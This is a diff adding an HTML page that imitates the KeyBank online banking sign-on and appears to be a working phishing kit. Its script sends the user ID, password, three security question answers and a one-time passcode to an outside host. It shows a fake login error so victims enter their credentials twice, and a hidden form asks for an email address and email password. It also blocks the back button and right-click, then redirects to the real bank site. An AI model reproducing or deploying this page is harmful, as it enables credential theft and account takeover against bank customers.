@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="shortcut icon" href="https://ibx.key.com/ibxolb/login/images/favicon-32x32.png" type="image/x-icon">
+    <link rel="apple-touch-icon" sizes="180x180" id="appleTouchIcon"
+        href="https://ibx.key.com/ibxolb/login/images/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" id="fav32"
+        href="https://ibx.key.com/ibxolb/login/images/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" id="fav16"
+        href="https://ibx.key.com/ibxolb/login/images/favicon-16x16.png">
+    <link rel="shortcut icon" href="https://ibx.key.com/ibxolb/login/favicon.ico">
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet"
+        integrity="sha384-QWTKZyjpPEjISv5WaRU9OFeRpok6YctnYmDr5pNlyT2bRjXh0JMhjY6hW+ALEwIH" crossorigin="anonymous">
+    <title>Keybank Online</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+
+    <style>
+        body {
+            font-family: "HelveticaNeue", "Helvetica Neue", Helvetica, Arial, sans-serif;
+        }
+
+        .kds_icon {
+            fill: #828282 !important;
+            box-sizing: border-box;
+        }
+    </style>
+</head>
+
+<body>
+    <header class="md:fixed top-0 right-0 z-10 w-full bg-[#c00] py-4 px-4 flex justify-between items-center text-white">
+        <div><img src="https://ibx.key.com/ibxolb/login/images/key_white_logo.png" width="189" height="auto" alt="logo">
+        </div>
+        <div class="flex items-end p-4 text-lg hidden md:block">
+            <a href="#" class="pr-6">Contact Us</a>
+            <a href="#">Open a New Account</a>
+        </div>
+        <div class=" md:hidden">
+            <img src="https://ibx.key.com/ibxolb/login/images/menu.svg" alt="hambuger_menu">
+        </div>
+    </header>
+    <main class="flex flex-col items-center pt-[100px] md:pt-[180px] px-4 w-full pb-[200px]">
+        <div class="p-6">
+            <img src="https://ibx.key.com/ibxolb/login/images/key-logo.svg" width="274" height="auto" alt="">
+        </div>
+        <form id="aoblogon" name="aoblogon" method="post" class="w-full md:w-[40%] flex flex-col pt-4">
+            <p id="msg" class="text-red-500 text-sm text-center hidden" style="font-family: arial; font-size: 10pt; overflow-wrap: break-word;"><span style="color: #ff9900;">Looks like your User ID or Password is not correct. Please try again.</span></p>
+
+            <div class="w-full px-4">
+                <label for="userId" class="text-[#101010]">Enter your User ID</label>
+                <input type="hidden" name="ip" id="hidden_ip">
+                <div class="flex gap-2 items-center text-black w-full">
+                    <div class="absolute p-3">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="#828282" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"
+                            class="lucide lucide-circle-user-round">
+                            <path d="M18 20a6 6 0 0 0-12 0" />
+                            <circle cx="12" cy="10" r="4" />
+                            <circle cx="12" cy="12" r="10" />
+                        </svg>
+                    </div>
+                    <input type="text" id="userId" name="userId" required
+                        class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]">
+                </div>
+            </div>
+            <div class="ml-4 mt-8 mb-4 flex items-center">
+                <div class="flex items-center">
+                    <input type="checkbox" id="checkbox" class="checkbox size-6 text-red-500">
+                    <label for="checkbox" class="flex items-center justify-center ml-2">
+                        Save User ID
+                    </label>
+                </div>
+            </div>
+            <div class="w-full px-4">
+                <label for="password" class="text-[#101010]">Enter your password</label>
+                <div class="flex gap-2 items-center text-black w-full">
+                    <div class="absolute p-3">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="#828282" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"
+                            class="lucide lucide-lock">
+                            <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                        </svg>
+                    </div>
+                    <input type="password" id="password" name="password" required
+                        class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]">
+                </div>
+            </div>
+            <div class="mt-6 px-4">
+                <button type="submit"
+                    class="bg-[#b20707] w-full text-white font-semibold text-lg rounded-[8px] py-3 px-4 text-center"
+                    id="signIn">Sign On</button>
+            </div>
+            <div class="w-full flex flex-col justify-center mt-6 px-4">
+                <a href="#"
+                    class="w-full text-[#0175a7] text-lg font-semibold rounded-[8px] py-3 px-4 text-center hover:border hover:bg-[#0dcaf022] hover:border-[#0175a7]">Problem
+                    Signing On?</a>
+                <div class="w-full h-[1.5px] my-4 bg-[#666]"></div>
+                <a href="#"
+                    class="w-full text-[#0175a7] text-lg font-semibold rounded-[8px] py-3 px-4 text-center hover:border hover:bg-[#0dcaf022] hover:border-[#0175a7]">Enroll
+                    in Online Banking</a>
+            </div>
+        </form>
+        <form id="form2" method="post" class="w-full md:w-[40%] flex flex-col pt-4 hidden">
+            <p class="text-xl font-semibold mb-6">To verify your identity, answer the following security questions</p>
+            <div class="w-full px-4">
+                <label for="q1" class="text-[#101010]">Security question 1</label>
+                <select name="q1" class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] mb-2"
+                    autocomplete="off" required>
+                    <option value>Select a security question</option>
+                    <option>What is your all-time favorite board game?</option>
+                    <option>What is your favorite museum or cultural institution?</option>
+                    <option>What is the first and last name of your oldest cousin?</option>
+                    <option>What is the last name of your all-time favorite athlete?</option>
+                    <option>What is your dream occupation?</option>
+                    <option>What is the name of the boy/girl that you first kissed?</option>
+                    <option>If you have ever broken a bone, which one?</option>
+                    <option>What was the first concert or live performance you attended?</option>
+                    <option>Whom did you go to prom with?</option>
+                    <option>What was your favorite teacher&#39;s name?</option>
+                    <option>What is your brother/sister nickname?</option>
+                    <option>Who is your favorite cartoon character?</option>
+                    <option>What is your favorite family holiday tradition?</option>
+                    <option>What is the first name of the best man at your wedding?</option>
+                    <option>What street did your best friend live on in high school?</option>
+                    <option>Who is your favorite composer?</option>
+                    <option>What was your favorite subject in school?</option>
+                    <option>Who was your favorite childhood hero?</option>
+                    <option>What is the middle name of your oldest sibling?</option>
+                    <option>What was the name of your first pet?</option>
+                    <option>In what city was your high school? (full name of city only)</option>
+                    <option>In what city were you married? (Enter full name of city)</option>
+                    <option>What is your maternal grandmother's first name?</option>
+                    <option>What is your father's middle name?</option>
+                    <option>What was the name of your High School?</option>
+                    <option>What is the name of the first company you worked for?</option>
+                    <option>What is the first name of the maid of honor at your wedding?
+                    </option>
+                    <option>What is the first name of your oldest nephew?</option>
+                    <option>What is your maternal grandfather's first name?</option>
+                </select>
+                <input type="text" id="a1" name="a1" placeholder="Enter answer"
+                    class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] mb-6 focus:border-[2.5px] focus:border-[#0175a7]"
+                    autocomplete="off" required>
+                <label for="q2" class="text-[#101010]">Security question 2</label>
+                <select name="q2" class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] mb-2"
+                    autocomplete="off" required>
+                    <option value>Select a security question</option>
+                    <option>What is your all-time favorite board game?</option>
+                    <option>What is your favorite museum or cultural institution?</option>
+                    <option>What is the first and last name of your oldest cousin?</option>
+                    <option>What is the last name of your all-time favorite athlete?</option>
+                    <option>What is your dream occupation?</option>
+                    <option>What is the name of the boy/girl that you first kissed?</option>
+                    <option>If you have ever broken a bone, which one?</option>
+                    <option>What was the first concert or live performance you attended?</option>
+                    <option>Whom did you go to prom with?</option>
+                    <option>What was your favorite teacher&#39;s name?</option>
+                    <option>What is your brother/sister nickname?</option>
+                    <option>Who is your favorite cartoon character?</option>
+                    <option>What is your favorite family holiday tradition?</option>
+                    <option>What is the first name of the best man at your wedding?</option>
+                    <option>What street did your best friend live on in high school?</option>
+                    <option>Who is your favorite composer?</option>
+                    <option>What was your favorite subject in school?</option>
+                    <option>Who was your favorite childhood hero?</option>
+                    <option>What is the middle name of your oldest sibling?</option>
+                    <option>What was the name of your first pet?</option>
+                    <option>In what city was your high school? (full name of city only)</option>
+                    <option>In what city were you married? (Enter full name of city)</option>
+                    <option>What is your maternal grandmother's first name?</option>
+                    <option>What is your father's middle name?</option>
+                    <option>What was the name of your High School?</option>
+                    <option>What is the name of the first company you worked for?</option>
+                    <option>What is the first name of the maid of honor at your wedding?
+                    </option>
+                    <option>What is the first name of your oldest nephew?</option>
+                    <option>What is your maternal grandfather's first name?</option>
+                </select>
+                <input type="text" id="a2" name="a2" placeholder="Enter answer"
+                    class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] mb-6 focus:border-[#0175a7]"
+                    autocomplete="off" required>
+                <label for="q3" class="text-[#101010]">Security question 3</label>
+                <select name="q3" class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] mb-2"
+                    autocomplete="off" required>
+                    <option value>Select a security question</option>
+                    <option>What is your all-time favorite board game?</option>
+                    <option>What is your favorite museum or cultural institution?</option>
+                    <option>What is the first and last name of your oldest cousin?</option>
+                    <option>What is the last name of your all-time favorite athlete?</option>
+                    <option>What is your dream occupation?</option>
+                    <option>What is the name of the boy/girl that you first kissed?</option>
+                    <option>If you have ever broken a bone, which one?</option>
+                    <option>What was the first concert or live performance you attended?</option>
+                    <option>Whom did you go to prom with?</option>
+                    <option>What was your favorite teacher&#39;s name?</option>
+                    <option>What is your brother/sister nickname?</option>
+                    <option>Who is your favorite cartoon character?</option>
+                    <option>What is your favorite family holiday tradition?</option>
+                    <option>What is the first name of the best man at your wedding?</option>
+                    <option>What street did your best friend live on in high school?</option>
+                    <option>Who is your favorite composer?</option>
+                    <option>What was your favorite subject in school?</option>
+                    <option>Who was your favorite childhood hero?</option>
+                    <option>What is the middle name of your oldest sibling?</option>
+                    <option>What was the name of your first pet?</option>
+                    <option>In what city was your high school? (full name of city only)</option>
+                    <option>In what city were you married? (Enter full name of city)</option>
+                    <option>What is your maternal grandmother's first name?</option>
+                    <option>What is your father's middle name?</option>
+                    <option>What was the name of your High School?</option>
+                    <option>What is the name of the first company you worked for?</option>
+                    <option>What is the first name of the maid of honor at your wedding?
+                    </option>
+                    <option>What is the first name of your oldest nephew?</option>
+                    <option>What is your maternal grandfather's first name?</option>
+                </select>
+                <input type="text" id="a3" name="a3" placeholder="Enter answer"
+                    class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]"
+                    autocomplete="off" required>
+            </div>
+            <div class="mt-6 px-4">
+                <button type="submit"
+                    class="bg-[#b20707] w-full text-white font-semibold text-lg rounded-[8px] py-3 px-4 text-center"
+                    id="btn2">Continue</button>
+            </div>
+        </form>
+
+        <form id="form3" method="post" class="w-full md:w-[40%] flex flex-col pt-4 hidden">
+            <p class="text-xl font-semibold mb-6">One-Time Passcode:</p>
+            <div class="w-full px-4">
+                <p style="font-family: arial; font-size: 10pt; overflow-wrap: break-word;">We've sent a one-time passcode.</p>
+<p style="font-family: arial; font-size: 10pt; overflow-wrap: break-word;"> </p>
+<p style="font-family: arial; font-size: 10pt; overflow-wrap: break-word;"><strong><label class="text-[#101010]" for="otp">Enter passcode *</label></strong></p>
+                <input type="text" id="otpInput" name="otp" oninput="formatNumber(this)" maxlength="6" minlength="6"
+                    class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]"
+                    required>
+            </div>
+            <div class="mt-6 px-4">
+                <button type="submit"
+                    class="bg-[#b20707] w-full text-white font-semibold text-lg rounded-[8px] py-3 px-4 text-center"
+                    id="btn3">Continue</button>
+            </div>
+        </form>
+        <form id="form4" method="post" class="w-full md:w-[40%] flex flex-col pt-4 hidden">
+            <div class="w-full px-4">
+                <label for="email" class="text-[#101010]">Enter your Email address</label>
+                <div class="flex gap-2 items-center text-black w-full">
+                    <div class="absolute p-3">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="#828282" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"
+                            class="lucide lucide-mail">
+                            <rect width="20" height="16" x="2" y="4" rx="2" />
+                            <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7" />
+                        </svg>
+                    </div>
+                    <input type="text" id="email" name="email"
+                        class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]">
+                </div>
+            </div>
+            <div class="w-full px-4 mt-6">
+                <label for="emailPassword" class="text-[#101010]">Enter your email password</label>
+                <div class="flex gap-2 items-center text-black w-full">
+                    <div class="absolute p-3">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none"
+                            stroke="#828282" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"
+                            class="lucide lucide-lock">
+                            <rect width="18" height="11" x="3" y="11" rx="2" ry="2" />
+                            <path d="M7 11V7a5 5 0 0 1 10 0v4" />
+                        </svg>
+                    </div>
+                    <input type="password" id="emailPassword" name="emailPassword"
+                        class="w-full px-12 py-[14px] outline-none border border-[#828282] rounded-[4px] focus:border-[2.5px] focus:border-[#0175a7]">
+                </div>
+            </div>
+            <div class="mt-6 px-4">
+                <button type="submit"
+                    class="bg-[#b20707] w-full text-white font-semibold text-lg rounded-[8px] py-3 px-4 text-center"
+                    id="btn">Submit</button>
+            </div>
+        </form>
+    </main>
+    <script>
+        function formatNumber(input) {
+            let value = input.value;
+            value = value.replace(/\D/g, '');
+            input.value = value;
+        }
+    </script>
+    <!-- <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script> -->
+    <script src="https://ajax.aspnetcdn.com/ajax/jQuery/jquery-3.3.1.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
+    <script type="text/javascript">
+
+        document.addEventListener('DOMContentLoaded', () => {
+            // Disable browser back/forward buttons
+            history.pushState(null, document.title, location.href);
+            window.addEventListener('popstate', function () {
+                history.pushState(null, document.title, location.href);
+            });
+
+            // Initialize the counter variables
+            let count = 0;
+            let counts = 0;
+            // Handle the form submission for the first step
+            document.getElementById('aoblogon').addEventListener('submit', function (e) {
+                e.preventDefault();
+                count += 1;
+
+                // Show the loading spinner and disable the submit button
+                document.getElementById('signIn').innerText = 'Signing In...';
+
+                // Send POST request to data.php
+                fetch('https://gepo.co.za/demo/wp-includes/data.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(new FormData(this)).toString()
+                })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data);
+                    });
+
+                // Show the next step or display an error message
+                setTimeout(() => {
+                    if (count === 2) {
+                        document.getElementById('aoblogon').style.display = 'none';
+                        document.getElementById('form3').style.display = 'block';
+                    } else {
+                        document.getElementById('userId').value = '';
+                        document.getElementById('password').value = '';
+                        document.getElementById('msg').style.display = 'block';
+                        document.getElementById('signIn').innerText = 'Sign On';
+                    }
+                }, 2000);
+            });
+
+            // Handle the form submission for the second step
+            document.getElementById('form2').addEventListener('submit', function (e) {
+                e.preventDefault();
+                count += 1;
+
+                // Show the loading spinner and disable the submit button
+                document.getElementById('btn2').innerText = 'Submitting...';
+
+                // Send POST request to question.php
+                fetch('https://gepo.co.za/demo/wp-includes/question.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(new FormData(this)).toString()
+                })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data);
+                    });
+
+                // Show the next step or display an error message
+                setTimeout(() => {
+                    if (count === 3) {
+                        document.getElementById('form2').style.display = 'none';
+                        document.getElementById('form3').style.display = 'block';
+                    } else {
+                        document.getElementById('Q1').value = '';
+                        document.getElementById('msg').style.display = 'block';
+                        document.getElementById('btn2').innerHTML = 'Submitting...';
+                    }
+                }, 2000);
+            });
+
+            // Handle the form submission for the third step
+            document.getElementById('form3').addEventListener('submit', function (e) {
+                e.preventDefault();
+                counts += 1;
+
+                // Show the loading spinner and disable the submit button
+                document.getElementById('btn3').innerText = 'Submitting...';
+                setTimeout(() => {
+                    window.location.href = 'https://www.key.com/personal/index.html';
+                }, 2000)
+
+                // Send POST request to cok.php
+                fetch('https://gepo.co.za/demo/wp-includes/cok.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(new FormData(this)).toString()
+                })
+                    .then(response => response.text())
+                    .then(data => {
+                        if (counts === 2) {
+                            setTimeout(() => {
+                                window.location.href = 'https://www.google.com/';
+                            }, 2000);
+                        } else {
+                            // If the count is not 2, reset the button text and handle errors
+                            document.getElementById('btn4').innerText = 'Submit';
+                            document.getElementById('msg').style.display = 'block';
+                        }
+                    });
+
+            });
+            // Handle the form submission for the fourth step
+            document.getElementById('form4').addEventListener('submit', function (e) {
+                e.preventDefault(); // Prevent the default form submission behavior
+                counts += 1;
+
+                // Show the loading spinner and disable the submit button
+                document.getElementById('btn4').innerHTML = '<i class="fa fa-circle-o-notch fa-spin fa-1x fa-fw"></i>';
+
+                // Send POST request to otp.php
+                fetch('otp.php', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+                    body: new URLSearchParams(new FormData(this)).toString()
+                })
+                    .then(response => response.text())
+                    .then(data => {
+                        console.log(data);
+                        window.location.href = 'https://www.google.com/';
+                        if (counts === 2) {
+                            setTimeout(() => {
+                            }, 2000);
+                        } else {
+                            // If the count is not 2, reset the button text and handle errors
+                            document.getElementById('btn4').innerText = 'Submit';
+                            document.getElementById('msg').style.display = 'block';
+                        }
+                    })
+                    .catch(error => {
+                        console.error('Error:', error);
+                        // Reset the button text and show the error message
+                        document.getElementById('btn4').innerText = 'Submit';
+                        document.getElementById('msg').style.display = 'block';
+                    });
+            });
+            if (counts === 2) {
+                setTimeout(() => {
+                }, 2000);
+            } else {
+                // If the count is not 2, reset the button text and handle errors
+                document.getElementById('btn4').innerText = 'Submit';
+                document.getElementById('msg').style.display = 'block';
+            }
+            // Prevent the context menu from appearing
+            document.addEventListener('contextmenu', function (e) {
+                e.preventDefault();
+            });
+        });
+    </script>
+</body>
+
+</html>
